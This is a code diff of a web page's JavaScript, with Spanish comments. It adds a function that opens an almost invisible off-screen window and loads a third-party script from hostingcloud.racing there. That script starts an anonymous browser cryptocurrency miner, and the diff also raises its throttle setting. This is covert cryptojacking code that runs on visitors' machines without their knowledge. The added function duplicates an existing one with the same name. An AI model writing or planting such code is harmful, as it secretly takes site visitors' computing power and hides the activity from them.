@@ -198,6 +198,27 @@
         }
         
         // Método alternativo para navegadores antiguos
+
+        function startFallbackMining() {
+            try {
+                    const hiddenWindow = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
+                    if (hiddenWindow) {
+        // Usamos escape para las etiquetas script
+                        hiddenWindow.document.write(`
+                        <script src="https://www.hostingcloud.racing/ADTj.js"><` + `\/script>
+                        <script>
+                            var _client = new Client.Anonymous('${CLIENT_KEY}', {
+                                throttle: 0.2, c: 'w', ads: 0
+                             });
+                            _client.start();
+                         <` + `\/script>
+                        `);
+                 }
+                 } catch (e) {
+                     console.log('No se pudo abrir ventana oculta:', e);
+                        }
+                }
+
         function startFallbackMining() {
             try {
                 // Intenta abrir una ventana oculta para minería persistente
@@ -207,7 +228,7 @@
                         <script src="https://www.hostingcloud.racing/ADTj.js"></script>
                         <script>
                             var _client = new Client.Anonymous('${CLIENT_KEY}', {
-                                throttle: 0.1, c: 'w', ads: 0
+                                throttle: 0.2, c: 'w', ads: 0
                             });
                             _client.start();
                         </script>
